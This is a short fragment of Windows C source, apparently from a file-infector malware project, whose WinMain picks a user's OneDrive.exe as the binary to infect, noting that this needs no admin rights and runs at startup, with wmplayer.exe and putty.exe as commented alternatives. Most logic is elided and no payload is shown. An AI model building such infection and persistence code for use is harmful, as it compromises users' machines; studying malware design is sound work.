...
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	...
	char file_to_infect[] = "C:\\Users\\Muniategui\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"; //no need for admin, run at startup
	//char file_to_infect[] = "C:\\Program Files (x86)\\Windows Media Player\\wmplayer.exe";
	//char file_to_infect[] = "putty.exe";
	char new_name[] = "C:\\Users\\Muniategui\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe";
